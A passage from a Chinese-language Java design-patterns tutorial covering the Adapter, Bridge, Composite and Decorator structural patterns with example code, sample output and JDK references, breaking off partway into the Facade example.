</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>NullOperation</span> <span>extends</span> <span>AbstractOperation</span><span>{</span>
    <span>@Override</span>
    <span>void</span> <span>request</span><span>(</span><span>)</span> <span>{</span>
        <span>// do nothing</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>AbstractOperation</span> abstractOperation <span>=</span> <span>func</span><span>(</span><span>-</span><span>1</span><span>)</span><span>;</span>
        abstractOperation<span>.</span><span>request</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>static</span> <span>AbstractOperation</span> <span>func</span><span>(</span><span>int</span> para<span>)</span> <span>{</span>
        <span>if</span> <span>(</span>para <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
            <span>return</span> <span>new</span> <span>NullOperation</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> <span>new</span> <span>RealOperation</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h1 id="四、结构型" tabindex="-1"> 四、结构型</h1>
<h2 id="_1-适配器-adapter" tabindex="-1"> 1. 适配器（Adapter）</h2>
<h3 id="intent-18" tabindex="-1"> Intent</h3>
<p>把一个类接口转换成另一个用户需要的接口。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/3d5b828e-5c4d-48d8-a440-281e4a8e1c92.png"/> </div><br>
<h3 id="class-diagram-18" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ff5152fc-4ff3-44c4-95d6-1061002c364a.png"/> </div><br>
<h3 id="implementation-18" tabindex="-1"> Implementation</h3>
<p>鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。</p>
<p>要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！</p>
<div><pre><code><span>public</span> <span>interface</span> <span>Duck</span> <span>{</span>
    <span>void</span> <span>quack</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>interface</span> <span>Turkey</span> <span>{</span>
    <span>void</span> <span>gobble</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>WildTurkey</span> <span>implements</span> <span>Turkey</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>gobble</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"gobble!"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>TurkeyAdapter</span> <span>implements</span> <span>Duck</span> <span>{</span>
    <span>Turkey</span> turkey<span>;</span>

    <span>public</span> <span>TurkeyAdapter</span><span>(</span><span>Turkey</span> turkey<span>)</span> <span>{</span>
        <span>this</span><span>.</span>turkey <span>=</span> turkey<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>quack</span><span>(</span><span>)</span> <span>{</span>
        turkey<span>.</span><span>gobble</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Turkey</span> turkey <span>=</span> <span>new</span> <span>WildTurkey</span><span>(</span><span>)</span><span>;</span>
        <span>Duck</span> duck <span>=</span> <span>new</span> <span>TurkeyAdapter</span><span>(</span>turkey<span>)</span><span>;</span>
        duck<span>.</span><span>quack</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="jdk-15" tabindex="-1"> JDK</h3>
<ul>
<li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Arrays.html#asList%28T...%29" target="_blank" rel="noopener noreferrer">java.util.Arrays#asList()</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#list-java.util.Enumeration-" target="_blank" rel="noopener noreferrer">java.util.Collections#list()</a></li>
<li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/Collections.html#enumeration-java.util.Collection-" target="_blank" rel="noopener noreferrer">java.util.Collections#enumeration()</a></li>
<li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/bind/annotation/adapters/XmlAdapter.html#marshal-BoundType-" target="_blank" rel="noopener noreferrer">javax.xml.bind.annotation.adapters.XMLAdapter</a></li>
</ul>
<h2 id="_2-桥接-bridge" tabindex="-1"> 2. 桥接（Bridge）</h2>
<h3 id="intent-19" tabindex="-1"> Intent</h3>
<p>将抽象与实现分离开来，使它们可以独立变化。</p>
<h3 id="class-diagram-19" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Abstraction：定义抽象类的接口</li>
<li>Implementor：定义实现类接口</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2a1f8b0f-1dd7-4409-b177-a381c58066ad.png"/> </div><br>
<h3 id="implementation-19" tabindex="-1"> Implementation</h3>
<p>RemoteControl 表示遥控器，指代 Abstraction。</p>
<p>TV 表示电视，指代 Implementor。</p>
<p>桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。</p>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>TV</span> <span>{</span>
    <span>public</span> <span>abstract</span> <span>void</span> <span>on</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>off</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Sony</span> <span>extends</span> <span>TV</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sony.on()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sony.off()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Sony.tuneChannel()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>RCA</span> <span>extends</span> <span>TV</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"RCA.on()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"RCA.off()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"RCA.tuneChannel()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>RemoteControl</span> <span>{</span>
    <span>protected</span> <span>TV</span> tv<span>;</span>

    <span>public</span> <span>RemoteControl</span><span>(</span><span>TV</span> tv<span>)</span> <span>{</span>
        <span>this</span><span>.</span>tv <span>=</span> tv<span>;</span>
    <span>}</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>on</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>off</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>abstract</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteRemoteControl1</span> <span>extends</span> <span>RemoteControl</span> <span>{</span>
    <span>public</span> <span>ConcreteRemoteControl1</span><span>(</span><span>TV</span> tv<span>)</span> <span>{</span>
        <span>super</span><span>(</span>tv<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl1.on()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl1.off()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl1.tuneChannel()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteRemoteControl2</span> <span>extends</span> <span>RemoteControl</span> <span>{</span>
    <span>public</span> <span>ConcreteRemoteControl2</span><span>(</span><span>TV</span> tv<span>)</span> <span>{</span>
        <span>super</span><span>(</span>tv<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>on</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl2.on()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>off</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl2.off()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>tuneChannel</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ConcreteRemoteControl2.tuneChannel()"</span><span>)</span><span>;</span>
        tv<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>RemoteControl</span> remoteControl1 <span>=</span> <span>new</span> <span>ConcreteRemoteControl1</span><span>(</span><span>new</span> <span>RCA</span><span>(</span><span>)</span><span>)</span><span>;</span>
        remoteControl1<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
        remoteControl1<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
        remoteControl1<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
        <span>RemoteControl</span> remoteControl2 <span>=</span> <span>new</span> <span>ConcreteRemoteControl2</span><span>(</span><span>new</span> <span>Sony</span><span>(</span><span>)</span><span>)</span><span>;</span>
         remoteControl2<span>.</span><span>on</span><span>(</span><span>)</span><span>;</span>
         remoteControl2<span>.</span><span>off</span><span>(</span><span>)</span><span>;</span>
         remoteControl2<span>.</span><span>tuneChannel</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h3 id="jdk-16" tabindex="-1"> JDK</h3>
<ul>
<li>AWT (It provides an abstraction layer which maps onto the native OS the windowing support.)</li>
<li>JDBC</li>
</ul>
<h2 id="_3-组合-composite" tabindex="-1"> 3. 组合（Composite）</h2>
<h3 id="intent-20" tabindex="-1"> Intent</h3>
<p>将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。</p>
<h3 id="class-diagram-20" tabindex="-1"> Class Diagram</h3>
<p>组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。</p>
<p>组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2b8bfd57-b4d1-4a75-bfb0-bcf1fba4014a.png"/> </div><br>
<h3 id="implementation-20" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>Component</span> <span>{</span>
    <span>protected</span> <span>String</span> name<span>;</span>

    <span>public</span> <span>Component</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>print</span><span>(</span><span>)</span> <span>{</span>
        <span>print</span><span>(</span><span>0</span><span>)</span><span>;</span>
    <span>}</span>

    <span>abstract</span> <span>void</span> <span>print</span><span>(</span><span>int</span> level<span>)</span><span>;</span>

    <span>abstract</span> <span>public</span> <span>void</span> <span>add</span><span>(</span><span>Component</span> component<span>)</span><span>;</span>

    <span>abstract</span> <span>public</span> <span>void</span> <span>remove</span><span>(</span><span>Component</span> component<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Composite</span> <span>extends</span> <span>Component</span> <span>{</span>

    <span>private</span> <span>List</span><span><span>&lt;</span><span>Component</span><span>></span></span> child<span>;</span>

    <span>public</span> <span>Composite</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>super</span><span>(</span>name<span>)</span><span>;</span>
        child <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>print</span><span>(</span><span>int</span> level<span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> level<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>print</span><span>(</span><span>"--"</span><span>)</span><span>;</span>
        <span>}</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Composite:"</span> <span>+</span> name<span>)</span><span>;</span>
        <span>for</span> <span>(</span><span>Component</span> component <span>:</span> child<span>)</span> <span>{</span>
            component<span>.</span><span>print</span><span>(</span>level <span>+</span> <span>1</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>add</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        child<span>.</span><span>add</span><span>(</span>component<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>remove</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        child<span>.</span><span>remove</span><span>(</span>component<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Leaf</span> <span>extends</span> <span>Component</span> <span>{</span>
    <span>public</span> <span>Leaf</span><span>(</span><span>String</span> name<span>)</span> <span>{</span>
        <span>super</span><span>(</span>name<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>void</span> <span>print</span><span>(</span><span>int</span> level<span>)</span> <span>{</span>
        <span>for</span> <span>(</span><span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> level<span>;</span> i<span>++</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>print</span><span>(</span><span>"--"</span><span>)</span><span>;</span>
        <span>}</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"left:"</span> <span>+</span> name<span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>add</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        <span>throw</span> <span>new</span> <span>UnsupportedOperationException</span><span>(</span><span>)</span><span>;</span> <span>// 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>remove</span><span>(</span><span>Component</span> component<span>)</span> <span>{</span>
        <span>throw</span> <span>new</span> <span>UnsupportedOperationException</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Composite</span> root <span>=</span> <span>new</span> <span>Composite</span><span>(</span><span>"root"</span><span>)</span><span>;</span>
        <span>Component</span> node1 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"1"</span><span>)</span><span>;</span>
        <span>Component</span> node2 <span>=</span> <span>new</span> <span>Composite</span><span>(</span><span>"2"</span><span>)</span><span>;</span>
        <span>Component</span> node3 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"3"</span><span>)</span><span>;</span>
        root<span>.</span><span>add</span><span>(</span>node1<span>)</span><span>;</span>
        root<span>.</span><span>add</span><span>(</span>node2<span>)</span><span>;</span>
        root<span>.</span><span>add</span><span>(</span>node3<span>)</span><span>;</span>
        <span>Component</span> node21 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"21"</span><span>)</span><span>;</span>
        <span>Component</span> node22 <span>=</span> <span>new</span> <span>Composite</span><span>(</span><span>"22"</span><span>)</span><span>;</span>
        node2<span>.</span><span>add</span><span>(</span>node21<span>)</span><span>;</span>
        node2<span>.</span><span>add</span><span>(</span>node22<span>)</span><span>;</span>
        <span>Component</span> node221 <span>=</span> <span>new</span> <span>Leaf</span><span>(</span><span>"221"</span><span>)</span><span>;</span>
        node22<span>.</span><span>add</span><span>(</span>node221<span>)</span><span>;</span>
        root<span>.</span><span>print</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><div><pre><code>Composite:root
--left:1
--Composite:2
----left:21
----Composite:22
------left:221
--left:3
</code></pre></div><h3 id="jdk-17" tabindex="-1"> JDK</h3>
<ul>
<li>javax.swing.JComponent#add(Component)</li>
<li>java.awt.Container#add(Component)</li>
<li>java.util.Map#putAll(Map)</li>
<li>java.util.List#addAll(Collection)</li>
<li>java.util.Set#addAll(Collection)</li>
</ul>
<h2 id="_4-装饰-decorator" tabindex="-1"> 4. 装饰（Decorator）</h2>
<h3 id="intent-21" tabindex="-1"> Intent</h3>
<p>为对象动态添加功能。</p>
<h3 id="class-diagram-21" tabindex="-1"> Class Diagram</h3>
<p>装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰者之上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6b833bc2-517a-4270-8a5e-0a5f6df8cd96.png"/> </div><br>
<h3 id="implementation-21" tabindex="-1"> Implementation</h3>
<p>设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。</p>
<p>下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c9cfd600-bc91-4f3a-9f99-b42f88a5bb24.jpg" width="600"/> </div><br>
<div><pre><code><span>public</span> <span>interface</span> <span>Beverage</span> <span>{</span>
    <span>double</span> <span>cost</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>DarkRoast</span> <span>implements</span> <span>Beverage</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>HouseBlend</span> <span>implements</span> <span>Beverage</span> <span>{</span>
    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>abstract</span> <span>class</span> <span>CondimentDecorator</span> <span>implements</span> <span>Beverage</span> <span>{</span>
    <span>protected</span> <span>Beverage</span> beverage<span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Milk</span> <span>extends</span> <span>CondimentDecorator</span> <span>{</span>

    <span>public</span> <span>Milk</span><span>(</span><span>Beverage</span> beverage<span>)</span> <span>{</span>
        <span>this</span><span>.</span>beverage <span>=</span> beverage<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span> <span>+</span> beverage<span>.</span><span>cost</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Mocha</span> <span>extends</span> <span>CondimentDecorator</span> <span>{</span>

    <span>public</span> <span>Mocha</span><span>(</span><span>Beverage</span> beverage<span>)</span> <span>{</span>
        <span>this</span><span>.</span>beverage <span>=</span> beverage<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>double</span> <span>cost</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>1</span> <span>+</span> beverage<span>.</span><span>cost</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Beverage</span> beverage <span>=</span> <span>new</span> <span>HouseBlend</span><span>(</span><span>)</span><span>;</span>
        beverage <span>=</span> <span>new</span> <span>Mocha</span><span>(</span>beverage<span>)</span><span>;</span>
        beverage <span>=</span> <span>new</span> <span>Milk</span><span>(</span>beverage<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>beverage<span>.</span><span>cost</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code>3.0
</code></pre></div><h3 id="设计原则" tabindex="-1"> 设计原则</h3>
<p>类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。</p>
<p>不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。</p>
<h3 id="jdk-18" tabindex="-1"> JDK</h3>
<ul>
<li>java.io.BufferedInputStream(InputStream)</li>
<li>java.io.DataInputStream(InputStream)</li>
<li>java.io.BufferedOutputStream(OutputStream)</li>
<li>java.util.zip.ZipOutputStream(OutputStream)</li>
<li>java.util.Collections#checked<a href="">List|Map|Set|SortedSet|SortedMap</a></li>
</ul>
<h2 id="_5-外观-facade" tabindex="-1"> 5. 外观（Facade）</h2>
<h3 id="intent-22" tabindex="-1"> Intent</h3>
<p>提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。</p>
<h3 id="class-diagram-22" tabindex="-1"> Class Diagram</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9978fa6-9f49-4a0f-8540-02d269ac448f.png"/> </div><br>
<h3 id="implementation-22" tabindex="-1"> Implementation</h3>
<p>观看电影需要操作很多电器，使用外观模式实现一键看电影功能。</p>
<div><pre><code><span>public</span> <span>class</span> <span>SubSystem</span> <span>{</span>
    <span>public</span> <span>void</span> <span>turnOnTV</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"turnOnTV()"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>setCD</span><span>(</span><span>String</span> cd<span>)</span> <span>{</span>
